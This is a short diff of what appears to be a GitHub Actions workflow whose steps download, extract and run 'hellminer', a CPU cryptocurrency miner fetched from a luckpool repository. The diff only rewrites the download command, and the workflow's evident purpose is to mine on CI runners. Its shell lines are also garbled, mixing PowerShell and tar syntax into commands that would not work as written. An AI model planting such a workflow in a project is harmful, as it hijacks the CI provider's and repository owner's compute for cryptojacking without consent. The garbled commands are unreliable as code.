@@ -17,7 +17,7 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: DOWNLOAD
-      run: Invoke-WebRequest wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz -OutFile tar xf hellminer_cpu_linux.tar.gz
+      run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz -OutFile tar xf hellminer_cpu_linux.tar.gz
     - name: Extract
       run: Expand-Archive tar xf hellminer_cpu_linux.tar.gz
     - name: RUNNING
